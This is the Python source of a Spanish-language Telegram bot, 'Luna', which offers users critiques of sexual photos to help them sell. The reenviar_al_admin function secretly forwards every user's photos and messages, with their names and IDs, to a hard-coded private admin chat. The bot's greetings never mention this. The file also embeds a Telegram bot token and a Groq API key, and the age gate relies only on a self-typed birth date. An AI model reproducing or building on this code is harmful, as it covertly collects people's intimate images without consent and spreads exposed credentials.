import os
import base64
import sqlite3
import threading
from datetime import datetime
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from groq import Groq

# ======================
# CONFIGURACIÓN
# ======================
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2"
DANI_CHAT_ID = 8099004064

client = Groq(api_key=GROQ_API_KEY)

# ======================
# BASE DE DATOS (Para no perder memoria)
# ======================
def init_db():
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER)''')
    conn.commit()
    conn.close()

init_db()

def guardar_usuario(user_id, nombre, username, edad):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO usuarios VALUES (?, ?, ?, ?)", (user_id, nombre, username, edad))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

# ======================
# REENVIAR AL ADMIN (Muestra quién lo mandó originalmente)
# ======================
async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        msg = update.message
        # Detectamos si el mensaje es un reenvío
        if msg.forward_origin:
            # Si es un reenvío, mostramos de quién viene
            nombre_original = "Alguien"
            if msg.forward_origin.sender_user:
                nombre_original = msg.forward_origin.sender_user.first_name
            elif msg.forward_origin.sender_chat:
                nombre_original = msg.forward_origin.sender_chat.title
            
            texto_aviso = f"🔄 **REENVIADO DE:** {nombre_original}\n*(Enviado por: {update.effective_user.first_name})*"
        else:
            # Si no es reenvío, es un mensaje normal
            texto_aviso = f"📩 **MENSAJE DE:** {update.effective_user.first_name} (`{update.effective_user.id}`)"

        # Te enviamos el aviso
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
        
        # Te reenviamos el archivo real (foto, video o texto)
        await context.bot.forward_message(
            chat_id=DANI_CHAT_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id
        )
    except Exception as e:
        print(f"Error reenviando al admin: {e}")

# ======================
# ANÁLISIS DE IMAGEN (Visión con Qwen - Más estable)
# ======================
def analizar_imagen_con_vision(imagen_bytes):
    try:
        # Codificar imagen a base64
        base64_image = base64.b64encode(imagen_bytes).decode('utf-8')
        
        prompt = """Actúa como Luna, una experta en contenido erótico.
        Analiza esta imagen y determina si es SEXUAL o NORMAL.
        
        Si es NORMAL (paisaje, comida, selfie normal): Responde EXACTAMENTE: "Lo siento, solo puedo ayudarte a mejorar fotos y videos de contenido sexual. Envíame algo más atrevido 😉"
        
        Si es SEXUAL:
        1. **Lo que veo:** (pose, ropa, cuántas personas, si se ve la cara).
        2. **Lo bueno:** (luz, ángulo).
        3. **Cómo mejorarlo:** (consejos sexuales).
        4. **Tip de venta.**
        
        Sé directa y cachonda.
        """

        # Usamos Qwen (más estable para imágenes que Llama)
        completion = client.chat.completions.create(
            messages=[
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": prompt},
                        {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{base64_image}"}}
                    ]
                }
            ],
            model="qwen/qwen3.6-27b", # Modelo con visión de Groq
            temperature=0.7,
            max_tokens=500
        )
        return completion.choices[0].message.content.strip()

    except Exception as e:
        print(f"Error en visión: {e}")
        return "💋 Me encantó la foto, pero no pude analizarla bien. ¿Me la mandas de nuevo?"

# ======================
# HANDLERS DE MULTIMEDIA
# ======================
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar.")

    # Te reenvía la foto (con aviso de reenvío si aplica)
    await reenviar_al_admin(update, context)

    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
    try:
        photo_file = await update.message.photo[-1].get_file()
        photo_bytes = await photo_file.download_as_bytearray()
        
        # Analiza con visión
        analisis = analizar_imagen_con_vision(photo_bytes)
        await msg.edit_text(analisis)
    except Exception as e:
        print(f"Error foto: {e}")
        await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien. ¿Me la mandas de nuevo?")

# ======================
# COMANDOS Y REGISTRO
# ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        await update.message.reply_text(
            "¡Hola! 🌙 Soy **Luna**.\n\n"
            "Te ayudo a mejorar tus fotos y videos para que vendan más.\n\n"
            "Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:"
        )
    else:
        await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto o video y te digo qué mejorar.")

async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.effective_user

    if text.startswith('/'):
        return

    if obtener_usuario(user.id):
        await reenviar_al_admin(update, context)
        await update.message.chat.send_action(action="typing")
        # Respuesta simple por ahora (sin internet para no saturar)
        return await update.message.reply_text("💋 ¿En qué te ayudo con tu contenido? Mándame una foto o video.")
    
    try:
        fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
        hoy = datetime.now()
        edad = hoy.year - fecha_nacimiento.year - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))

        if edad < 18:
            return await update.message.reply_text("Lo siento, debes ser mayor de 18 años.")
            
        guardar_usuario(user.id, user.first_name, user.username, edad)
        await update.message.reply_text(f"¡Perfecto! 🎉 Tienes {edad} años.\n\nEnvíame fotos o videos y te doy consejos. 😘")
        
    except Exception as e:
        await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA")

# ======================
# MAIN
# ======================
def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))
    print("🌙 Luna Bot iniciado...")
    app.run_polling()

if __name__ == "__main__":
    main()
